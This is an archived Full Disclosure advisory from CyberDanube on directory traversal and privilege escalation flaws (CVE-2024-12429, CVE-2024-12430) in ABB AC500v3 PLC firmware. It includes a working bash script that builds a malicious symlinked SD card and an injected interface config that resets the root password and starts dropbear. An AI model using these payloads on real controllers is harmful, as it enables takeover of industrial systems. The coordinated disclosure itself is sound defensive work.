---
title: CyberDanube Security Research 20250107-0 | Multiple Vulnerabilities in ABB AC500v3
url: https://seclists.org/fulldisclosure/2025/Jan/5
source: Full Disclosure
date: 2025-01-17
fetch_date: 2025-10-06T20:13:44.546167
---

# CyberDanube Security Research 20250107-0 | Multiple Vulnerabilities in ABB AC500v3

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#5)
[![Next](/images/right-icon-16x16.png)](6)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#5)
[![Next](/images/right-icon-16x16.png)](6)

![](/shared/images/nst-icons.svg#search)

# CyberDanube Security Research 20250107-0 | Multiple Vulnerabilities in ABB AC500v3

---

*From*: Thomas Weber | CyberDanube via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Thu, 9 Jan 2025 20:05:44 +0000

---

```
CyberDanube Security Research 20250107-0
-------------------------------------------------------------------------------
                title| Multiple Vulnerabilities in ABB AC500v3
              product| ABB AC500v3
   vulnerable version| <=3.7.0.569
        fixed version| 3.8.0
           CVE number| CVE-2024-12429, CVE-2024-12430
               impact| High
             homepage| https://global.abb
                found| 2024-09-03
                   by| D. Blagojevic, S. Dietz, T. Weber
                     | CyberDanube Security Research
                     | Austria - Vienna
                     | https://www.cyberdanube.com
                     |
                     | This work received funding from the Austrian Research
                     | Promotion Agency (FFG) in course of the KIRAS project
                     | TestCat (FO999911248) and was supported by AIT Austrian
                     | Institute of Technology.
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
"ABB is a technology leader in electrification and automation, enabling a more
sustainable and resource-efficient future. The company’s solutions connect
engineering know-how and software to optimize how things are manufactured,
moved, powered and operated. Building on more than 140 years of excellence,
ABB’s 105,000 employees are committed to driving innovations that accelerate
industrial transformation."

Source: https://global.abb/group/en/about/

Vulnerable versions
-------------------------------------------------------------------------------
AC500v3 / <= 3.7.0.569

Vulnerability overview
-------------------------------------------------------------------------------
1) Directory Traversal via Symlink (CVE-2024-12429)
A directory traversal vulnerability was identified in the file-explorer
functionality of the device. An attacker can use this vulnerability to read
system-wide files and configuration as user "system".

2) Privilege Escalation (CVE-2024-12430)
A file which gets executed as "root" is owned by "system". An attacker
can abuse this by injecting arbitrary commands.

Proof of Concept
-------------------------------------------------------------------------------
1) Directory Traversal via Symlink (CVE-2024-12429)
When formatting a sd card to ext4 and creating a symlink to "/", an attacker
can access system critical files via the automation builder file-explorer.
-------------------------------------------------------------------------------
#!/bin/bash

# CyberDanube 2024 <S. Dietz>
# abb ac500 symlink exploit

if [ -z "$1" ]; then
  echo "usage: ./abb_ac500_symlink.sh /dev/sdX"
  exit 1
fi

if [ "$(id -u)" -ne "0" ]; then
    echo "This script must be run as root or with sudo."
    exit 1
fi

DISK="$1"
PART="${DISK}1"
MOUNT_POINT="/mnt/sdcard"
SYMLINK_TARGET="/"
SYMLINK_NAME="pwned"

umount ${DISK}* 2>/dev/null

# Delete all existing partitions on the disk
(
echo o
echo w
) | fdisk "$DISK"

# Create a new partition on /dev/sda
(
echo n
echo p
echo 1
echo
echo
echo w
) | fdisk "$DISK"

partprobe "$DISK"

mkfs.ext4 -F "${PART}"
mkdir -p ${MOUNT_POINT}
mount ${PART} ${MOUNT_POINT}
ln -s ${SYMLINK_TARGET} ${MOUNT_POINT}/${SYMLINK_NAME}
ls -l ${MOUNT_POINT}
umount ${MOUNT_POINT}
echo "Done."
-------------------------------------------------------------------------------

2) Privilege Escalation (CVE-2024-12430)
The file /mnt/sysdata/netconfig/ifs/ETH1 is writable by the user "system". This
file configures the network interface during boot as user "root". An attacker
can modify this file by using 1) and inject arbitrary commands. Our poc changes
the root password and starts dropbear.
-------------------------------------------------------------------------------
auto ETH1
iface ETH1 inet static
    address 192.168.19.123
    netmask 255.255.255.0
    post-up ip route add 192.168.19.0/24 dev ETH1 table ETH1
    post-up ip rule add from 192.168.19.123/32 table ETH1 priority 100
    post-up ip rule add from 0.0.0.0/32 to 192.168.19.0/24 dev ETH1 table ETH1
    post-up ip route add default via 192.168.19.254 table ETH1
    post-up ip route add default via 192.168.19.254 dev ETH1 metric 0
    post-up echo 'root:password' | chpasswd
    post-up /etc/init.d/dropbear start
-------------------------------------------------------------------------------

Solution
-------------------------------------------------------------------------------
Update to the latest firmware

Workaround
-------------------------------------------------------------------------------
None

Recommendation
-------------------------------------------------------------------------------
Update to the latest firmware. See recommendations in the ABB Cyber Security
Advisory for further information:
https://search.abb.com/library/Download.aspx?DocumentID=3ADR011377&LanguageCode=en&DocumentPartId=&Action=Launch

Contact Timeline
-------------------------------------------------------------------------------
2024-09-04: Contacting ABB via cybersecurity () ch abb com
2024-09-16: Asking if there are any updates regarding the issue.
2024-09-19: Email encryption issue arises. Sending PGP public key again.
2024-09-20: Discussing acknowledgment text and data privacy consent request.
2024-11-04: Asking if there are any updates regarding the issue.
2024-11-07: ABB is requesting a one-month extension of the disclosure deadline.
2024-12-14: ABB requests another extension due to holidays.
2025-01-07: Coordinated release of advisory.

Web: https://www.cyberdanube.com
Twitter: https://twitter.com/cyberdanube
Mail: research at cyberdanube dot com

EOF D. Blagojevic, S. Dietz, T. Weber / @2025
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#5)
[![Next](/images/right-icon-16x16.png)](6)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#5)
[![Next](/images/right-icon-16x16.png)](6)

### Current thread:

* **CyberDanube Security Research 20250107-0 | Multiple Vulnerabilities in ABB AC500v3** *Thomas Weber | CyberDanube via Fulldisclosure (Jan 15)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap ...